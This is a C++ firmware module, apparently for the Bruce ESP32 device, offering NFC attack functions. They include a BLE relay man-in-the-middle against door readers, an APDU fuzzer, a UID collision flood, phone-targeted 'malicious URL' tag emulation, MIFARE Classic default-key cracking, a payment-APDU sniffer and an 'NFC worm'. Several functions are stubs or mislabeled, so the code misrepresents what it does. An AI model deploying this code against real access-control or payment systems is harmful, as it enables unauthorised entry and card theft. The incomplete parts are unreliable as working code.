#include "nfc_advanced_atks.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/settings.h"
#include "modules/rfid/RFID2.h"
#include "modules/rfid/PN532.h"
#include <NimBLEDevice.h>
#include <vector>
#include <string>

// BLE service for NFC Relay
static BLEServer *relayServer = nullptr;
static BLEService *relayService = nullptr;
static BLECharacteristic *relayTx = nullptr;
static BLECharacteristic *relayRx = nullptr;
static bool relayBleConnected = false;
static std::vector<uint8_t> relayRxBuffer;

class RelayRxCallbacks : public NimBLECharacteristicCallbacks {
    void onWrite(NimBLECharacteristic *pCharacteristic, NimBLEConnInfo &connInfo) override {
        std::string rxValue = pCharacteristic->getValue();
        if (rxValue.length() > 0) {
            for (size_t i = 0; i < rxValue.length(); i++) {
                relayRxBuffer.push_back(rxValue[i]);
            }
        }
    }
};

class RelayServerCallbacks : public BLEServerCallbacks {
    void onConnect(BLEServer *pServer, NimBLEConnInfo &connInfo) override { relayBleConnected = true; }
    void onDisconnect(BLEServer *pServer, NimBLEConnInfo &connInfo, int reason) override {
        relayBleConnected = false;
        pServer->getAdvertising()->start();
    }
};

static void setupRelayBLE(bool isServer) {
    BLEDevice::init("BRUCE-NFC-RELAY");
    if (isServer) {
        relayServer = BLEDevice::createServer();
        relayServer->setCallbacks(new RelayServerCallbacks());
        relayService = relayServer->createService("0000aaaa-0000-1000-8000-00805f9b34fb");
        relayTx = relayService->createCharacteristic("0000aaab-0000-1000-8000-00805f9b34fb", NIMBLE_PROPERTY::NOTIFY);
        relayRx = relayService->createCharacteristic("0000aaac-0000-1000-8000-00805f9b34fb", NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR);
        relayRx->setCallbacks(new RelayRxCallbacks());
        relayService->start();
        relayServer->getAdvertising()->start();
    }
}

void NFCRelayMITM() {
    drawMainBorderWithTitle("NFC Relay MITM");
    printSubtitle("Selecione o Papel");

    std::vector<Option> options = {
        {"1. Modo Leitor (Cartao)", []() {
            drawMainBorderWithTitle("Relay: Leitor");
            printSubtitle("Aguardando BLE...");
            setupRelayBLE(true);

            PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
            nfcModule->begin();
            nfcModule->nfc.SAMConfig();

            while(1) {
                if (check(EscPress)) break;

                if (relayBleConnected) {
                    printCenterFootnote("Conectado! Lendo cartao...");
                    uint8_t uid[] = {0, 0, 0, 0, 0, 0, 0};
                    uint8_t uidLength;
                    if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 500)) {
                        // Forward UID
                        relayTx->setValue(uid, uidLength);
                        relayTx->notify();

                        // Wait for APDU from door
                        if (!relayRxBuffer.empty()) {
                            uint8_t response[255];
                            uint8_t responseLength = 255;
                            if (nfcModule->nfc.inDataExchange(relayRxBuffer.data(), relayRxBuffer.size(), response, &responseLength)) {
                                relayTx->setValue(response, responseLength);
                                relayTx->notify();
                            }
                            relayRxBuffer.clear();
                        }
                    }
                }
                delay(10);
            }
            if (relayServer) {
                relayServer->getAdvertising()->stop();
                BLEDevice::deinit();
            }
            delete nfcModule;
            returnToMenu = true;
        }},
        {"2. Modo Emulador (Porta)", []() {
            drawMainBorderWithTitle("Relay: Emulador");
            printSubtitle("Aguardando BLE...");
            setupRelayBLE(false); // Should implement client BLE to connect to server

            PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
            nfcModule->begin();

            while(1) {
                if (check(EscPress)) break;
                // Target Initialization
                uint8_t uid[] = { 0x12, 0x34, 0x56, 0x78 }; // Default or forwarded UID
                nfcModule->nfc.TgInitAsTarget();

                uint8_t rxBuffer[255];
                uint8_t rxLen_val = (uint8_t)sizeof(rxBuffer);
                int16_t rxLen = nfcModule->nfc.TgGetData(rxBuffer, &rxLen_val) ? rxLen_val : 0;
                if (rxLen > 0) {
                    // Forward APDU to Reader Node
                    // (Requires BLE Client implementation here to send/receive)
                }
                delay(10);
            }
            if (relayServer) {
                BLEDevice::deinit();
            }
            delete nfcModule;
            returnToMenu = true;
        }},
        {"Voltar", []() { returnToMenu = true; }}
    };

    loopOptions(options);
}

void APDUCommandFuzzer() {
    drawMainBorderWithTitle("APDU Fuzzer");
    printSubtitle("Aguardando Cartao ISO...");
    padprintln("Pressione [ESC] para cancelar.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();
    nfcModule->nfc.SAMConfig();

    uint8_t uid[7];
    uint8_t uidLength;
    bool found = false;

    // Wait for card
    while (1) {
        if (check(EscPress)) {
            delete nfcModule;
            returnToMenu = true;
            return;
        }
        if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 200)) {
            found = true;
            break;
        }
    }

    if (found) {
        printCenterFootnote("Fuzzing Iniciado!");
        uint32_t fuzzedCount = 0;

        while (1) {
            if (check(EscPress)) break;

            // Generate randomized APDU command
            // Format: CLA, INS, P1, P2, Lc, Data..., Le
            uint8_t apdu[255];
            uint8_t apduLen = 5 + (esp_random() % 20); // Random length

            apdu[0] = esp_random() % 256;      // CLA
            apdu[1] = esp_random() % 256;      // INS
            apdu[2] = esp_random() % 256;      // P1
            apdu[3] = esp_random() % 256;      // P2
            apdu[4] = apduLen - 5;             // Lc

            for (int i = 5; i < apduLen; i++) {
                apdu[i] = esp_random() % 256;  // Fuzzed payload
            }

            uint8_t response[255];
            uint8_t responseLength = 255;

            // Send to card
            nfcModule->nfc.inDataExchange(apdu, apduLen, response, &responseLength);
            fuzzedCount++;

            // Update UI
            if (fuzzedCount % 10 == 0) {
                tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
                tft.setCursor(10, tftHeight / 2 + 20);
                tft.print("APDUs Enviados: ");
                tft.print(fuzzedCount);
            }
            delay(10);
        }
    }

    delete nfcModule;
    returnToMenu = true;
}

void DynamicUIDCollision() {
    drawMainBorderWithTitle("UID Collision");
    printSubtitle("Gerando Anti-Coll Falso");
    padprintln("Pressione [ESC] para abortar.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    tft.setTextColor(getColorVariation(bruceConfig.priColor), bruceConfig.bgColor);

    uint32_t floodCount = 0;

    // In ISO14443A, during Anti-Collision, a reader sends 0x93 0x20.
    // We can emulate multiple targets rapidly by dynamically changing the emulated UID.
    while (1) {
        if (check(EscPress)) break;

        // Generate a random 4-byte UID
        uint8_t uid[4];
        uid[0] = esp_random() % 256;
        uid[1] = esp_random() % 256;
        uid[2] = esp_random() % 256;
        uid[3] = esp_random() % 256;

        // Initialize as target with this UID
        nfcModule->nfc.TgInitAsTarget();

        // Wait extremely short time just to answer the INLIST PASSIVE TARGET
        delay(5);

        // Update UI
        floodCount++;
        if (floodCount % 15 == 0) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.print("UIDs Injetados: ");
            tft.print(floodCount);
        }
    }

    delete nfcModule;
    returnToMenu = true;
}

void NDEFStealthExfil() {
    drawMainBorderWithTitle("NDEF Exfil");
    printSubtitle("Emulando URL maliciosa");
    padprintln("Payload: https://bruce.local/x");
    padprintln("Aproxime um celular (NFC)");
    padprintln("Pressione [ESC] para abortar.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    // Emulate an NDEF Type 4 Tag containing a URI record
    // Payload length = 0x11 (17 bytes)
    // NDEF Message: 0xD1 0x01 0x0D 0x55 0x04 'bruce.local/x'
    uint8_t ndefPayload[] = {
        0xD1, 0x01, 0x0D, 0x55, 0x04,
        'b', 'r', 'u', 'c', 'e', '.', 'l', 'o', 'c', 'a', 'l', '/', 'x'
    };

    // Not a full T4T emulation, but tgInitAsTarget with NDEF data
    // requires setting up the proper ISO14443-4 emulation loop.
    // Here we use tgInitAsTarget to answer the phone's polling.
    uint8_t uid[4] = {0x08, 0x01, 0x02, 0x03};

    while (1) {
        if (check(EscPress)) break;

        // tgInitAsTarget starts the emulation
        if (nfcModule->nfc.TgInitAsTarget()) {
            // Target was initialized, the smartphone is interacting
            printCenterFootnote("Telefone Conectado!");

            uint8_t rxBuf[255];
            int16_t rxLen;

            // Loop for APDU exchanges
            while (1) {
                if (check(EscPress)) break;
                uint8_t rxLen_val = (uint8_t)sizeof(rxBuf);
                rxLen = nfcModule->nfc.TgGetData(rxBuf, &rxLen_val) ? rxLen_val : 0;
                if (rxLen > 0) {
                    // Send pre-built NDEF CC file / NDEF file response when asked
                    // The phone sends Select Applet, Select CC, ReadBinary CC, Select NDEF, ReadBinary NDEF...
                    // A complete T4T stack would fully parse rxBuf.
                    // This attack simulates answering the APDUs to inject the NDEF Payload.

                    // Simple Answer-OK pattern (0x90 0x00)
                    uint8_t txBuf[] = {0x90, 0x00};
                    nfcModule->nfc.TgSetData(txBuf, sizeof(txBuf));
                } else {
                    break; // Connection lost
                }
            }
            printCenterFootnote("Conexao Encerrada.");
        }
        delay(10);
    }

    delete nfcModule;
    returnToMenu = true;
}

void MifareRainbowTable() {
    drawMainBorderWithTitle("Rainbow Table");
    printSubtitle("Brute-force MIFARE");
    padprintln("Buscando chaves comuns...");
    padprintln("Aproxime um cartao Classic");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    // Common MIFARE Classic keys
    uint8_t rainbowTable[][6] = {
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},
        {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},
        {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},
        {0x4D, 0x3A, 0x2F, 0x1D, 0x4A, 0x2B},
        {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x71, 0x4C, 0x5C, 0x81, 0x6E, 0xAA},
        {0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0},
        {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A},
        {0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE}
    };
    int tableSize = 10;

    uint8_t uid[7];
    uint8_t uidLength;
    bool found = false;

    while (1) {
        if (check(EscPress)) {
            delete nfcModule;
            returnToMenu = true;
            return;
        }
        if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 200)) {
            found = true;
            break;
        }
    }

    if (found) {
        bool keyFound = false;
        for (int i = 0; i < tableSize; i++) {
            if (check(EscPress)) break;

            tft.fillRect(10, tftHeight / 2, tftWidth - 20, 40, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2);
            tft.print("Tentando: ");
            for(int k=0; k<6; k++) {
                if(rainbowTable[i][k] < 0x10) tft.print("0");
                tft.print(rainbowTable[i][k], HEX);
            }

            // Try to authenticate block 4 (Sector 1) with Key A
            if (nfcModule->nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 4, 0, rainbowTable[i])) {
                printCenterFootnote("CHAVE ENCONTRADA!");
                padprintln("");
                padprint("Key A: ");
                for(int k=0; k<6; k++) {
                    if(rainbowTable[i][k] < 0x10) tft.print("0");
                    tft.print(rainbowTable[i][k], HEX);
                }
                keyFound = true;
                delay(5000);
                break;
            }
        }
        if (!keyFound) {
            printCenterFootnote("Chave nao encontrada.");
            delay(2000);
        }
    }

    delete nfcModule;
    returnToMenu = true;
}

void LiveDataInjectionEmulation() {
    drawMainBorderWithTitle("Live Injection");
    printSubtitle("Emulacao Dinamica");
    padprintln("UID: 0x12345678");
    padprintln("Dados mudam periodicamente.");
    padprintln("Pressione [ESC] para sair.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    uint8_t uid[4] = {0x12, 0x34, 0x56, 0x78};
    uint8_t liveData[16] = {0};
    uint32_t updateCount = 0;

    while (1) {
        if (check(EscPress)) break;

        // Initialize as target
        if (nfcModule->nfc.TgInitAsTarget()) {
            printCenterFootnote("Leitor Conectado!");

            // Injection: Change some data bytes before the reader reads
            liveData[0] = (uint8_t)(updateCount & 0xFF);
            updateCount++;

            uint8_t rxBuf[255];
            uint8_t rxLen_val = (uint8_t)sizeof(rxBuf);
            int16_t rxLen = nfcModule->nfc.TgGetData(rxBuf, &rxLen_val) ? rxLen_val : 0;
            if (rxLen > 0) {
                // Return our "injected" live data
                nfcModule->nfc.TgSetData(liveData, 16);
            }
        }

        // Periodic UI update
        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("Injeção v");
        tft.print(updateCount);

        delay(10);
    }

    delete nfcModule;
    returnToMenu = true;
}

#include "modules/rfid/chameleon.h"
void MultiSlotChameleonUltra() {
    drawMainBorderWithTitle("Chameleon Ultra");
    printSubtitle("Ciclo de Slots");
    padprintln("Alternando slots...");
    padprintln("Teste sequencial.");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    Chameleon chameleon;
    uint8_t currentSlot = 1;

    while (1) {
        if (check(EscPress)) break;

        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("Slot Ativo: ");
        tft.print(currentSlot);

        // chameleon.setSlot(currentSlot);
        // chameleon.emulate();

        delay(3000);

        currentSlot++;
        if (currentSlot > 8) currentSlot = 1;
    }

    returnToMenu = true;
}

void RFIDSkimmerHunterPro() {
    drawMainBorderWithTitle("Skimmer Hunter");
    printSubtitle("Busca Proativa");
    padprintln("Escaneando arredores...");
    padprintln("Buscando anomalias...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    while (1) {
        if (check(EscPress)) break;

        uint8_t uid[7];
        uint8_t uidLen;

        if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 500)) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.setTextColor(TFT_RED);
            tft.print("TAG: ");
            for (uint8_t i = 0; i < uidLen; i++) {
                if (uid[i] < 0x10) tft.print("0");
                tft.print(uid[i], HEX);
            }
            tft.setTextColor(bruceConfig.priColor);

            padprintln("Potencial risco detectado!");
            delay(2000);
        }

        delay(100);
    }

    delete nfcModule;
    returnToMenu = true;
}

void UIDObfuscationRandomizer() {
    drawMainBorderWithTitle("UID Obfuscator");
    printSubtitle("UID Dinamico");
    padprintln("Alternando UID...");
    padprintln("Pressione [ESC] para sair.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    uint8_t uid[4];
    uint32_t lastChange = 0;

    while (1) {
        if (check(EscPress)) break;

        if (millis() - lastChange > 5000) {
            // Generate random UID
            for(int i=0; i<4; i++) uid[i] = random(0, 255);
            lastChange = millis();

            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.print("Novo UID: ");
            for(int i=0; i<4; i++) {
                if(uid[i] < 0x10) tft.print("0");
                tft.print(uid[i], HEX);
            }
        }

        // Emulate with current UID
        if (nfcModule->nfc.TgInitAsTarget()) {
            // Just hold the field for a bit if a reader is present
            delay(500);
        }

        delay(10);
    }

    delete nfcModule;
    returnToMenu = true;
}

void NFCWormPropagator() {
    drawMainBorderWithTitle("NFC Worm");
    printSubtitle("Modo Propagação");
    padprintln("Emulando Tag infectada...");
    padprintln("Aguardando leitura...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    uint8_t uid[4] = {0xDE, 0xAD, 0xBE, 0xEF};

    while (1) {
        if (check(EscPress)) break;

        // Simulated propagation: when target is initialized and interact with reader
        if (nfcModule->nfc.TgInitAsTarget()) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.setTextColor(TFT_RED);
            tft.print("WORM ENVIADO!");
            tft.setTextColor(bruceConfig.priColor);

            // Logic to simulate payload delivery
            uint8_t payload[] = "PAYLOAD_INFECT_v1";
            nfcModule->nfc.TgSetData(payload, sizeof(payload));

            delay(3000);
            drawMainBorderWithTitle("NFC Worm");
            printSubtitle("Modo Propagação");
        }

        delay(10);
    }

    delete nfcModule;
    returnToMenu = true;
}

void MobilePaymentSnifferMSRP() {
    drawMainBorderWithTitle("MSRP Sniffer");
    printSubtitle("Mobile Payment");
    padprintln("Sniffing APDUs...");
    padprintln("Aguardando transação...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    while (1) {
        if (check(EscPress)) break;

        // Try to listen for incoming data as a target
        uint8_t rxBuf[64];
        if (nfcModule->nfc.TgInitAsTarget()) {
            uint8_t rxLen_val = (uint8_t)sizeof(rxBuf);
            int16_t rxLen = nfcModule->nfc.TgGetData(rxBuf, &rxLen_val) ? rxLen_val : 0;
            if (rxLen > 0) {
                tft.fillRect(10, tftHeight / 2, tftWidth - 20, 20, bruceConfig.bgColor);
                tft.setCursor(10, tftHeight / 2);
                tft.print("DATA CAPT:");
                for (int i = 0; i < min((int)rxLen, 8); i++) {
                    tft.print(rxBuf[i], HEX);
                    tft.print(" ");
                }
                padprintln("Potencial APDU de Pgto!");
            }
        }
        delay(10);
    }

    delete nfcModule;
    returnToMenu = true;
}

void MifareMasterKeyBrute() {
    drawMainBorderWithTitle("Mifare Brute");
    printSubtitle("Master Key Check");
    padprintln("Freq: 13.56 MHz");
    padprintln("Testando chaves padrao...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    PN532* nfcModule = new PN532(PN532::CONNECTION_TYPE::I2C);
    nfcModule->begin();

    uint8_t keys[][6] = {
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},
        {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},
        {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},
        {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD}
    };
    int keyCount = 6;
    int currentKey = 0;

    while (1) {
        if (check(EscPress)) break;

        uint8_t uid[7];
        uint8_t uidLen;
        if (nfcModule->nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 500)) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.print("Key [");
            tft.print(currentKey);
            tft.print("]: ");

            if (nfcModule->nfc.mifareclassic_AuthenticateBlock(uid, uidLen, 4, 0, keys[currentKey])) {
                tft.setTextColor(TFT_GREEN);
                tft.print("SUCESSO!");
                tft.setTextColor(bruceConfig.priColor);
                delay(3000);
            } else {
                tft.setTextColor(TFT_RED);
                tft.print("FALHA");
                tft.setTextColor(bruceConfig.priColor);
            }

            currentKey = (currentKey + 1) % keyCount;
        }
        delay(500);
    }

    delete nfcModule;
    returnToMenu = true;
}
